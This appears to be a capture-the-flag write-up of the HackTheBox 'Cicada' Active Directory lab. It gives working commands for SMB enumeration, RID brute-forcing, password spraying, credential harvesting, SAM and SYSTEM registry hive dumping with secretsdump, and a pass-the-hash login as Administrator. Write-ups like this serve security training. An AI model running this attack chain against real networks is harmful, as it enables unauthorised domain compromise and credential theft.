+++
date = '2026-07-11T03:17:51+02:00'
draft = false
title = 'Cicada Writeup EN'
+++
**Name**: **`joy.scd01`**

**Date**: **`28/01/2025`**

![Cicada.png](/images/imgs_cicada/Cicada.png)

---
# Introduction

**_Cicada_** is an **Easy-level Active Directory** environment from **HackTheBox**. One of the first AD I have done. It illustrates how poor password hygiene and overly permissive shares can snowball into a full domain compromise.

The initial foothold relies heavily on **SMB** enumeration. Starting with anonymous/Guest access, I found a welcome letter containing a default company password. By utilizing **RID Brute-forcing**, I generated a valid user list and sprayed the default password to compromise my first account. Moving laterally required meticulous enumeration: checking user descriptions yielded a password for a second user, which unlocked a new **SMB** share. Inside, a backup script contained hardcoded credentials for a third user, granting **WinRM** access.
For privilege escalation, the compromised user had **`SeBackupPrivilege`** enabled, which I abused to dump the **registry hives** (**SAM** and **SYSTEM**), extract the local **Administrator** hash, and achieve full domain compromise via a **Pass-The-Hash attack**.

---
# Techniques Used

- **RID Brute-forcing & Password Spraying**

- **Privilege Escalation via SeBackupPrivilege**

- **Registry Hive Dumping**

- **Pass-The-Hash**

---
# Enumeration

## nmap

Initial full port scan:

```bash
nmap -p- -Pn cicada
```

```text
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
60286/tcp open  unknown
```

Targeted scan with script and service detection:

```bash
nmap -sC -sV -Pn cicada
```

```text
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-11 04:09:41Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: 2026-07-11T04:11:03+00:00; +5h01m15s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: 2026-07-11T04:11:03+00:00; +5h01m15s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: 2026-07-11T04:11:03+00:00; +5h01m15s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-07-11T04:11:03+00:00; +5h01m15s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-07-11T04:10:24
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 5h01m14s, deviation: 0s, median: 5h01m14s
```

The scans revealed standard Active Directory ports.

I added **`cicada.htb`** and **`cicada-dc.cicada.htb`** to my **`/etc/hosts`** file.

## SMB Enumeration

I started by checking for anonymous or Guest access on the **SMB** service using **NetExec**:

```bash
nxc smb cicada.htb -u 'Guest' -p '' --shares
```

![smb.png](/images/imgs_cicada/smb.png)

The output showed access to a share named **`HR`**. I connected to it using **smbclient**:

```bash
smbclient \\\\cicada.htb\\HR -U Guest
```

![smbclient.png](/images/imgs_cicada/smbclient.png)

Inside, I found a document named **`Notice from HR.txt`**. I downloaded and read its contents:

```text
Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:
...
```

The note leaked a default company password: **`Cicada$M6Corpb*@Lp#nZp!8`**.

---
# Initial Access | RID Brute-forcing & Password Spraying

To use this password, I needed a list of valid domain users. Since I had Guest access to **SMB**, I used **NetExec** to perform a **RID Brute-force** attack against the **Domain Controller**:

```bash
nxc smb cicada.htb -u 'Guest' -p '' --rid-brute
```

![ridbrute.png](/images/imgs_cicada/ridbrute.png)

This successfully dumped the domain users. I cleaned the output and saved it into a file named **`users`**:

```text
Administrator
Guest
krbtgt
CICADA-DC$
john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
emily.oscars
```

With a valid user list and the leaked default password, I performed a **Password Spray attack**:

```bash
nxc smb cicada.htb -u users -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success
```

![spraying.png](/images/imgs_cicada/spraying.png)

I got a hit on the user **`michael.wrightson`**.

---
# Lateral Movement | Michael → David

I checked if **Michael** had **WinRM** access to get a shell, but it failed. I also checked for new **SMB** shares or additional **RID** information using **Michael**'s credentials, but nothing new appeared.

Here I've been stuck for a moment, then I remembered of the **`--user`** flag for **`nxc`** and I give it a try. I struck gold in the **Active Directory Description** field:

```bash
nxc smb cicada.htb -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
```

![cleartextpw.png](/images/imgs_cicada/cleartextpw.png)

**Note**: _**Administrators** or users often leave sensitive information (like temporary passwords) in the **Active Directory Description** fields. Querying these fields is a fundamental step in internal **AD** enumeration._

---
# Lateral Movement | David → Emily

I checked **David** for **WinRM** access, but again, no shell. So I restarted my **SMB** enumeration using his account:

```bash
nxc smb cicada.htb -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --shares
```

This time, I had read access to a new share called **`DEV`**. I connected to it:

```bash
smbclient \\\\cicada.htb\\DEV -U david.orelious
```

![smbclient2.png](/images/imgs_cicada/smbclient2.png)

Inside, I found a **PowerShell** script named **`Backup_script.ps1`**. I downloaded it and read the contents:

![emily.png](/images/imgs_cicada/emily.png)

The script contained hardcoded credentials for a third user: 
- **`emily.oscars:Q!<REDACTED>Vt`**.

I tested these credentials against **WinRM**:

```bash
nxc winrm cicada.htb -u 'emily.oscars' -p 'Q!<REDACTED>Vt'
```

**`(Pwn3d!)`**.

I finally established a remote session using **Evil-WinRM**:

```bash
evil-winrm -i cicada.htb -u emily.oscars -p 'Q!<REDACTED>Vt'
```

![initialroof.png](/images/imgs_cicada/initialproof.png)

I obtained the user flag located at **`C:\Users\emily.oscars\Desktop\user.txt`**.

---
# Privilege Escalation | SeBackupPrivilege

Once logged in, I started checking my privileges using **`whoami /priv`**.

![lhf.png](/images/imgs_cicada/lhf.png)

I noticed that the account possessed the **`SeBackupPrivilege`**.

**Note**: _The **`SeBackupPrivilege`** is designed to allow users to back up files and directories, bypassing all file read security permissions. From an attacker's perspective, this means we can read any file on the system, regardless of its **ACL**. Most importantly, it allows us to create copies of the **SAM** (**Security Account Manager**) and **SYSTEM** **registry hives**, which store local user hashes._

To exploit this, I used the **`reg save`** command to dump the hives into the current directory:

```powershell
reg save hklm\sam SAM.hive
reg save hklm\system SYSTEM.hive
```

I then downloaded both hives to my local attacker machine using the download command in **Evil-WinRM**:

```powershell
download SAM.hive
download SYSTEM.hive
```

With the hives transferred, I used **Impacket**'s **`secretsdump.py`** to extract the local hashes:

```bash
python3 -m venv venv 

source venv/bin/activate

pip3 install impacket

secretsdump.py -sam SAM.hive -system SYSTEM.hive LOCAL
```

```text
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b<REDACTED>41:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up...
```

## Pass-The-Hash to SYSTEM

With the **NT hash**, I performed a **Pass-The-Hash attack** using **Evil-WinRM** to log in as **Administrator**:

```bash
evil-winrm -i cicada.htb -u Administrator -H '2b<REDACTED>41'
```

![systemproof.png](/images/imgs_cicada/systemproof.png)

Domain fully compromised. I was able to read the **root flag**.

---
# Final Thoughts

**_Cicada_** is essentially a masterclass in checking everything twice.

This environment highlights the dangers of human error: leaving default passwords in public shares, writing sensitive data in **Active Directory description fields**, and hardcoding credentials inside scripts. The **SeBackupPrivilege** is a Low-Hanging Fruit that is the equivalent to handing over the **keys to the kingdom**.